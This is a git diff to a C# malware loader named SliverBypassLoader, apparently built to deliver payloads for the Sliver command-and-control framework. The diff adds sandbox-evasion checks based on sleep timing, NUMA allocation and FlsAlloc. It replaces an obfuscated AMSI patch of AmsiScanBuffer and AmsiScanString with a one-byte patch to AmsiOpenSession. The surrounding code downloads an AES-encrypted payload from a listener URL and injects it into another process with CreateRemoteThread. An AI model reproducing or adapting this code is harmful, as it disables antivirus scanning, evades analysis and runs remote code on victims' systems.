@@ -14,6 +14,7 @@ using System.Runtime.Remoting.Contexts;
 using System.IO.Compression;
 using System.Net;
 using System.Security.Cryptography;
+using System.Diagnostics;
 
 namespace SliverBypassLoader
 {
@@ -134,8 +135,33 @@ namespace SliverBypassLoader
         [DllImport("kernel32")] 
         public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 
+        [DllImport("kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
+        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);
+
+        [DllImport("kernel32.dll")]
+        static extern void Sleep(uint dwMilliseconds);
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
+
+        [DllImport("kernel32.dll")]
+        static extern UInt32 FlsAlloc(IntPtr lpCallback);
+
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);
+
+        [DllImport("kernel32.dll")]
+        public static extern bool CloseHandle(IntPtr hObject);
+
         private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
         private static UInt32 MEM_COMMIT = 0x1000;
+        private static int PROCESS_VM_OPERATION = 0x0008;
+        private static int PROCESS_VM_READ = 0x0010;
+        private static int PROCESS_VM_WRITE = 0x0020;
+
         public static void Main(string[] args)
         {
             // Parse args
@@ -153,6 +179,26 @@ namespace SliverBypassLoader
                 compressAlgorithm = args[2];
                 aesKey = args[3];
                 aesIv = args[4];
+            }
+
+            DateTime t1 = DateTime.Now;
+            Sleep(2000);
+            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
+            if (t2 < 1.5)
+            {
+                return;
+            }
+
+            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
+            if (mem == null)
+            {
+                return;
+            }
+
+            UInt32 result = FlsAlloc(IntPtr.Zero);
+            if (result != 0xFFFFFFFF)
+            {
+                return;
             }
 
             Bypass();
@@ -178,66 +224,41 @@ namespace SliverBypassLoader
 
             DownloadAndExecute(listenerUrl, targetBinary, compressAlgorithm, aesKey, aesIv);
         }
-
-        // Dynamically search for and patch AmsiScanBuffer and AmsiScanString
         static int Bypass()
         {
-            Char c1, c2, c3, c4, c5, c6, c7, c8, c9, c10;
-            c1 = 'A';
-            c2 = 's';
-            c3 = 'c';
-            c4 = 'n';
-            c5 = 'l';
-            c6 = 't';
-            c7 = 'z';
-            c8 = 'U';
-            c9 = 'y';
-            c10 = 'o';
-            string[] filePaths = Directory.GetFiles(@"c:\wind" + c10 + "ws\\s" + c9 + "stem32", "a?s?.d*");
-            string libname = (filePaths[0].Substring(filePaths[0].Length - 8));
-            try
+            byte patch = 0xEB;
+
+            IntPtr hHandle = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, false, Process.GetCurrentProcess().Id);
+            if (hHandle != IntPtr.Zero)
             {
-                uint lpflOldProtect;
-                var lib = LoadLibrary(libname);
-                // AmsiUacInitialize
-                var baseaddr = GetProcAddress(lib, c1 + "m" + c2 + "i" + c8 + "a" + c3 + "I" + c4 + "i" + c6 + "ia" + c5 + "i" + c7 + "e");
-                int buffsize = 1000;
-                var randoffset = baseaddr - buffsize;
-                IntPtr hProcess = GetCurrentProcess();
-                byte[] addrBuf = new byte[buffsize];
-                IntPtr nRead = IntPtr.Zero;
-                ReadProcessMemory(hProcess, randoffset, addrBuf, addrBuf.Length, out nRead);
-                byte[] asb = new byte[7] { 0x4c, 0x8b, 0xdc, 0x49, 0x89, 0x5b, 0x08 };
-                Int32 asbrelloc = (PatternAt(addrBuf, asb)).First();
-                var funcaddr = baseaddr - (buffsize - asbrelloc);
-                VirtualProtect(funcaddr, new UIntPtr(8), 0x40, out lpflOldProtect);
-                Marshal.Copy(new byte[] { 0x90, 0xC3 }, 0, funcaddr, 2);
-                byte[] ass = new byte[7] { 0x48, 0x83, 0xec, 0x38, 0x45, 0x33, 0xdb };
-                Int32 assrelloc = (PatternAt(addrBuf, ass)).First();
-                funcaddr = baseaddr - (buffsize - assrelloc);
-                VirtualProtect(funcaddr, new UIntPtr(8), 0x40, out lpflOldProtect);
-                Marshal.Copy(new byte[] { 0x90, 0xC3 }, 0, funcaddr, 2);
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine(ex.ToString());
-                Console.WriteLine("Could not patch " + libname + "...");
+                Console.WriteLine("[+] Process opened with Handle ~> " + hHandle);
             }
 
+            IntPtr amsiDLL = LoadLibrary("amsi.dll");
+            if (amsiDLL != IntPtr.Zero)
+            {
+                Console.WriteLine("[+] amsi.dll located at ~> " + amsiDLL);
+            }
+
+            IntPtr amsiOpenSession = GetProcAddress(amsiDLL, "AmsiOpenSession");
+            if (amsiOpenSession != IntPtr.Zero)
+            {
+                Console.WriteLine("[+] AmsiOpenSession located at ~> " + amsiOpenSession);
+            }
+
+            IntPtr patchAddr = (IntPtr)(amsiOpenSession.ToInt64() + 3);
+            Console.WriteLine("[+] Trying to Inject ~> " + patchAddr);
+
+            int bytesWritten = 0;
+            bool result = WriteProcessMemory(hHandle, patchAddr, new byte[] { patch }, 1, out bytesWritten);
+            if (result)
+            {
+                Console.WriteLine("[!] Process Memory Injected!");
+            }
+
+            CloseHandle(hHandle);
             return 0;
         }
-
-        public static IEnumerable<int> PatternAt(byte[] source, byte[] pattern)
-        {
-            for (int i = 0; i < source.Length; i++)
-            {
-                if (source.Skip(i).Take(pattern.Length).SequenceEqual(pattern))
-                {
-                    yield return i;
-                }
-            }
-        }
-
         public static void DownloadAndExecute(string url, string TargetBinary, string CompressionAlgorithm, string aeskey, string aesiv)
         {
             byte[] AESKey = Encoding.ASCII.GetBytes(aeskey);
@@ -287,7 +308,6 @@ namespace SliverBypassLoader
             CreateRemoteThread(hProcess, new IntPtr(0), new uint(), spaceAddr, new IntPtr(0), new uint(), new IntPtr(0));
             return;
         }
-
         public static byte[] Decompress(byte[] data, string CompressionAlgorithm)
         {
             byte[] decompressedArray = null;
@@ -323,11 +343,8 @@ namespace SliverBypassLoader
             }
             else
             {
-
                 return data;
             }
-
-
         }
         public static byte[] Decrypt(byte[] ciphertext, byte[] AESKey, byte[] AESIV)
         {
